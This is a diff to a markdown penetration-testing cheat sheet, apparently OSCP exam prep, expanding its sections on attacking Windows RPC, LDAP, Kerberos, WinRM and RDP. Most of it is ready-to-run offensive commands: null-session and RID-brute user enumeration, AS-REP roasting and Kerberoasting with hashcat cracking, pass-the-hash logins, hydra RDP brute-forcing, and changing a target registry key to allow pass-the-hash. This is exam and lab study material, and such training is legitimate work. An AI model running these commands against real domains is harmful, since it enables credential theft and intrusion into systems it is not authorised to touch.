@@ -2543,60 +2543,180 @@ See `[AD-LATERAL]` (Volume 5) for the full "move to another machine" menu.
 
 **Where it leads:** creds, loot, moving laterally, and full AD enumeration → `[FOUND-SMB]`, spray creds, `[AD-ENUM]`.
 
-## [ENUM-RPC]  Port 135 (Windows RPC) / Port 111 (Unix RPC)
-**What it is:** 135 is a Windows service that can leak **users and domain info** (sometimes when SMB won't). 111 is the Unix "portmapper" that points you to **NFS** file shares.
-```bash
-rpcclient -U '' -N $IP     # connect with no creds; then type: enumdomusers / enumdomgroups / queryuser 0x<rid> / srvinfo
-impacket-rpcdump $IP       # list the available RPC services
-rpcinfo -p $IP             # Unix side (111): what RPC services exist
-showmount -e $IP           # Unix side: list NFS exports (shared folders)
+## [ENUM-RPC]  Port 135 MSRPC (Windows) / Port 111 rpcbind (Unix) — FULL CHAIN
+**What it is:** **135** = Windows RPC endpoint mapper — a **null session** here can leak **users, groups, domain info** (sometimes when SMB blocks it). **111** = Unix portmapper — points you at **NFS** and other RPC services.
+
+### 🗺️ Decision tree
 ```
-**Where it leads:** usernames (→ spray/roast), NFS shares to mount.
-
-## [ENUM-LDAP]  Ports 389/636/3268/3269 — LDAP (the AD directory)  → `[AD-ENUM]`, `[TECH-LDAP]`
-**What it is:** the Active Directory database, queried over the network. An "anonymous bind" (no login) can sometimes dump all users, computers, and their **descriptions** — and admins sometimes stash **passwords in the description field**.
-```bash
-ldapsearch -x -H ldap://$IP -s base namingcontexts     # find the "base DN" (e.g. dc=corp,dc=local) — you need this
-ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"      # anonymous dump: users, descriptions (creds!), computers
-ldapsearch -x -H ldap://$IP -D '$U@corp.local' -w '$P' -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName description   # with creds
-nxc ldap $IP -u $U -p $P --users --groups --asreproast asrep.txt --kerberoasting kerb.txt   # users + build roast target lists
-ldapdomaindump -u 'corp.local\$U' -p $P $IP            # dump everything to browsable HTML/JSON
+135 (Windows) → rpcclient null/guest session → enumdomusers/groups → user list → spray/roast [AD-QUICK]
+                 (also high ports 49152+ = DCE/RPC services ; impacket-rpcdump to map them)
+111 (Unix)    → rpcinfo -p → is NFS(2049) there? → showmount -e → [ENUM-NFS]
 ```
-> `-x` = simple auth, `-H` = the server URL, `-b` = the "base DN" (where in the tree to start — get it from the first command). The **base DN** is just the directory's root path, written like `dc=corp,dc=local` for the domain `corp.local`.
 
-**Where it leads:** full AD enumeration, passwords in descriptions, Kerberoast/AS-REP target lists, and data to feed BloodHound (`[AD-BLOODHOUND]`).
-
-## [ENUM-KERBEROS]  Port 88 — Kerberos (AD login system)  → `[AD-KERBEROAST]`, `[AD-ASREP]`
-**What it is:** the authentication system Active Directory uses. **The moment you see port 88 open, this machine is a Domain Controller — switch your whole mindset to "this is AD."**
+### Windows RPC (135)
 ```bash
-sudo ntpdate $IP     # FIRST fix the clock (Kerberos fails if your clock differs from the DC's)
-impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP   # AS-REP roast: grab crackable hashes with NO creds
-impacket-GetUserSPNs -request <domain>/$U:$P -dc-ip $IP                   # Kerberoast: grab crackable hashes with ANY one cred
+rpcclient -U '' -N $IP            # NULL session (no creds). then inside, type:
+#   srvinfo                        # OS / server info
+#   enumdomusers                   # all domain users  ← the win
+#   enumdomgroups ; querygroupmem 0x200
+#   queryuser 0x<rid>              # details for a user (RID from enumdomusers)
+#   querydispinfo                  # users + descriptions (creds hide here)
+#   getdompwinfo                   # password policy (lockout → safe spraying)
+rpcclient -U 'guest%' $IP          # guest fallback
+impacket-rpcdump @$IP              # list all DCE/RPC endpoints (incl. the 49152+ high ports)
+impacket-lookupsid $IP -no-pass    # brute RIDs → usernames (no creds)
+nxc smb $IP -u '' -p '' --rid-brute   # same via nxc
 ```
-> **AS-REP roasting** = some accounts are misconfigured so anyone can request a chunk of crackable data (a "hash") for them, no login needed. **Kerberoasting** = with *any* valid account you can request crackable hashes for service accounts. Both hashes get cracked offline in Volume 3.
+→ usernames → `users.txt` → spray/roast (`[AD-QUICK]`).
 
-**Where it leads:** crackable hashes → passwords, and confirmed usernames → `[AD-QUICK]`.
-
-## [ENUM-WINRM]  Ports 5985/5986 — WinRM (remote PowerShell)  → `[TECH-WINRM]`
-**What it is:** remote PowerShell access — **if** your account is in the "Remote Management Users" or Administrators group. Once you have working creds, this is a prime way to get an interactive Windows shell.
+### Unix RPC (111)
 ```bash
-nxc winrm $IP -u $U -p $P     # test the creds — if it prints "(Pwn3d!)" you CAN get a shell
-evil-winrm -i $IP -u $U -p $P # get the interactive shell (has built-in 'upload' and 'download' commands)
-evil-winrm -i $IP -u $U -H <ntlmhash>   # log in with a hash instead of a password
+rpcinfo -p $IP                     # list RPC services (look for nfs/mountd)
+showmount -e $IP                   # NFS exports → [ENUM-NFS]
 ```
-> `(Pwn3d!)` in nxc output = "these creds are strong enough to execute here" — a green light.
-**Troubleshoot:** nxc validates but evil-winrm fails → the user isn't allowed WinRM. TLS on port 5986 → add `-S`. Kerberos time errors → `ntpdate`.
-**Where it leads:** an interactive Windows foothold → `[WINDOWS-PRIVESC-QUICK]`.
 
-## [ENUM-RDP]  Port 3389 — RDP (Remote Desktop, the GUI)  → `[TECH-RDP]`
-**What it is:** full graphical remote desktop. With valid creds you get a Windows desktop; very old versions have the risky "BlueKeep" exploit (rarely needed).
-```bash
-nxc rdp $IP -u $U -p $P                                       # test whether the creds work for RDP
-xfreerdp /v:$IP /u:$U /p:$P +clipboard /dynamic-resolution    # connect to the desktop   [MUST-RECOGNIZE]
-xfreerdp /v:$IP /u:$U /pth:<ntlmhash>                         # pass-the-hash (needs "Restricted Admin" mode)
-xfreerdp /v:$IP /u:$U /p:$P /drive:share,/tmp                 # share your /tmp into the session to move files
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `NT_STATUS_ACCESS_DENIED` on rpcclient | null session disabled → need creds; try `guest%` |
+| `enumdomusers` empty | not a DC / restricted → try `querydispinfo`, or RID-brute via lookupsid |
+| 111 shows nothing | portmapper filtered → nmap `-sU -p111` too |
+
+**Leads to:** usernames → `[AD-QUICK]` / spray; NFS → `[ENUM-NFS]`.
+
+## [ENUM-LDAP]  Ports 389/636/3268/3269 — LDAP (the AD directory) — FULL CHAIN  → `[AD-ENUM]`, `[TECH-LDAP]`
+**What it is:** the AD database over the wire. The win: **anonymous bind** can dump users/computers, and admins hide **passwords in the `description`/`info` fields**. With creds → full domain map + roast target lists → feed **BloodHound**.
+
+### 🗺️ Decision tree
 ```
-**Where it leads:** a graphical foothold — handy for running winPEAS visually or moving files via clipboard/mapped drive.
+find base DN (namingcontexts) → anonymous bind allowed?
+   YES → dump users+descriptions (creds!) + computers → build user list → spray/roast
+   NO  → need creds → with ANY cred: full dump (ldapdomaindump), roast lists, BloodHound → [AD-QUICK]
+LDAPS (636) if 389 says "strongerAuthRequired"
+```
+
+### Step 1 — Base DN + anonymous dump
+```bash
+ldapsearch -x -H ldap://$IP -s base namingcontexts          # → the base DN, e.g. dc=corp,dc=local (you NEED this)
+ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"            # anonymous: EVERYTHING (users, computers, descriptions)
+ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName description memberOf | grep -iE 'sAMAccountName|description'
+nxc ldap $IP -u '' -p ''                                     # quick anon check via nxc
+```
+- `description:` / `info:` fields with a password → spray it. **Save all sAMAccountNames → `users.txt`.**
+
+### Step 2 — With creds → full map + roast lists
+```bash
+ldapsearch -x -H ldap://$IP -D 'corp.local\$U' -w '$P' -b "dc=corp,dc=local"
+ldapdomaindump -u 'corp.local\$U' -p '$P' $IP -o ldd/        # browsable HTML/JSON of the whole domain
+nxc ldap $IP -u $U -p $P --users --groups --asreproast asrep.txt --kerberoasting kerb.txt --trusted-for-delegation
+bloodhound-python -u $U -p $P -d corp.local -ns $IP -c all --zip   # → BloodHound graph → [AD-BLOODHOUND]
+windapsearch -d corp.local -u $U -p $P --dc-ip $IP -U         # users via LDAP
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `strongerAuthRequired` | LDAPS needed → use `ldaps://$IP` (636) or `-ZZ` |
+| anon bind returns nothing | anonymous disabled → need any domain cred |
+| `Invalid credentials (49)` | wrong user/pass/domain format → try `user@corp.local` or `corp.local\user` |
+| don't know the base DN | get it from `namingcontexts` (Step 1) or `nxc smb $IP` domain field |
+
+**Leads to:** user list + roast targets + BloodHound → the full AD chain `[AD-QUICK]`.
+
+## [ENUM-KERBEROS]  Port 88 — Kerberos (AD) — FULL CHAIN  → `[AD-KERBEROAST]`, `[AD-ASREP]`
+**🚨 Port 88 open = this is a DOMAIN CONTROLLER. Switch to AD mode.** Two "free" credential attacks live here.
+
+### 🗺️ Decision tree
+```
+FIX CLOCK FIRST (sudo ntpdate $IP) — or everything errors with KRB_AP_ERR_SKEW
+have a user list? → AS-REP roast (NO creds needed) → crack -m 18200
+have ANY one cred? → Kerberoast (service-account hashes) → crack -m 13100
+            also → enumerate, BloodHound, then the full AD chain [AD-QUICK]
+no user list? → build one: RID-brute (SMB/RPC), LDAP, kerbrute userenum, SMTP
+```
+
+### Steps
+```bash
+sudo ntpdate $IP                                             # ⏰ FIRST — fix clock skew
+# build/validate a user list (also AS-REP roasts in one go):
+kerbrute userenum -d corp.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
+impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip $IP -format hashcat -outputfile asrep.txt   # AS-REP (no creds)
+hashcat -m 18200 asrep.txt rockyou.txt                       # crack AS-REP
+# with ANY one cred → Kerberoast:
+impacket-GetUserSPNs -request corp.local/$U:$P -dc-ip $IP -outputfile tgs.txt
+hashcat -m 13100 tgs.txt rockyou.txt                         # crack Kerberoast
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `KRB_AP_ERR_SKEW` / clock skew | `sudo ntpdate $IP` (or `rdate -n $IP`) |
+| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | username doesn't exist → fix your user list |
+| GetNPUsers returns nothing | no AS-REP-roastable users → need a cred for Kerberoast |
+| name resolution fails | add the domain + DC to `/etc/hosts` (`$IP dc01.corp.local corp.local`) |
+
+**Leads to:** crackable hashes → passwords → `[AD-QUICK]` (the full 40-point chain).
+
+## [ENUM-WINRM]  Ports 5985/5986 — WinRM (remote PowerShell) — FULL CHAIN  → `[TECH-WINRM]`
+**What it is:** remote PowerShell — **if** your account is in **Remote Management Users** or local Administrators. With working creds, this is the cleanest interactive Windows shell. (WinRM alone, with no creds, is not a way in — you need creds from elsewhere.)
+
+### 🗺️ Decision tree
+```
+have creds/hash? → nxc winrm test:
+   "(Pwn3d!)" → evil-winrm → interactive shell → [WINDOWS-PRIVESC-QUICK]
+   valid but NOT Pwn3d → user lacks WinRM rights → use SMB instead (psexec/wmiexec) if admin
+no creds → get them elsewhere (SMB/LDAP/Kerberoast/web) → come back
+```
+
+### Steps
+```bash
+nxc winrm $IP -u $U -p $P                 # (Pwn3d!) = you can execute here
+nxc winrm $IP -u $U -H <ntlmhash>         # test with a hash (pass-the-hash)
+evil-winrm -i $IP -u $U -p $P             # interactive shell (built-in upload/download)
+evil-winrm -i $IP -u $U -H <ntlmhash>     # PtH shell
+evil-winrm -i $IP -u $U -p $P -S          # TLS on 5986
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| nxc valid but evil-winrm fails | account not in Remote Management Users → use psexec/wmiexec (if admin) |
+| `Error: ... SSL` on 5986 | add `-S` (and `-P 5986`) |
+| Kerberos/time errors | `ntpdate $IP`; or use `-u user -p pass` (NTLM) not Kerberos |
+| hangs / no prompt | wrong creds or firewall → re-check with `nxc winrm` first |
+
+**Leads to:** interactive Windows foothold → `[WINDOWS-PRIVESC-QUICK]`.
+
+## [ENUM-RDP]  Port 3389 — RDP (Remote Desktop GUI) — FULL CHAIN  → `[TECH-RDP]`
+**What it is:** graphical remote desktop. With creds → a full Windows desktop (great for running winPEAS visually, moving files, GUI-only apps). Very old unpatched = BlueKeep (rarely the OSCP path).
+
+### 🗺️ Decision tree
+```
+have creds/hash? → nxc rdp test → xfreerdp login (GUI foothold)
+   PtH? → xfreerdp /pth: (needs Restricted Admin reg setting; set it if you have another foothold)
+no creds → brute ONLY with a known user (watch lockout) ; or BlueKeep if truly ancient (crash risk)
+```
+
+### Steps
+```bash
+nxc rdp $IP -u $U -p $P                                            # validate creds (Pwn3d! = logon works)
+xfreerdp /v:$IP /u:$U /p:$P +clipboard /dynamic-resolution /cert:ignore   # connect   [MUST-RECOGNIZE]
+xfreerdp /v:$IP /u:$U /pth:<ntlmhash> /cert:ignore                 # pass-the-hash (needs Restricted Admin)
+xfreerdp /v:$IP /u:$U /p:$P /drive:kali,/tmp                       # map your /tmp into the session (transfer files)
+# brute (last resort, known user):
+hydra -l <user> -P rockyou.txt rdp://$IP -t 1                      # -t 1 : RDP locks accounts fast
+nmap -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info $IP           # version/vuln + hostname/domain leak
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `/pth:` fails | target needs `DisableRestrictedAdmin=0` reg key (set it via another shell) |
+| cert / negotiation error | add `/cert:ignore` (older: `/cert-ignore`) |
+| black screen / disconnect | `/dynamic-resolution`, drop `+clipboard`, or try `/sec:rdp` |
+| "account lockout" risk | RDP locks fast → brute with `-t 1`, prefer found creds |
+
+**Leads to:** a GUI foothold (run winPEAS visually, transfer via mapped drive/clipboard) → `[WINDOWS-PRIVESC-QUICK]`.
 
 ## [ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring) — FULL CHAIN  → `[TECH-SNMP]`
 **What it is:** a monitoring protocol on **UDP 161** (so a TCP scan misses it — you need `-sU`). Guarded by a "community string" (a shared password); the default is `public`. If you can read it, it dumps **running process command-lines (passwords hide here!), users, installed software, listening ports, network info** — huge loot for near-zero effort.
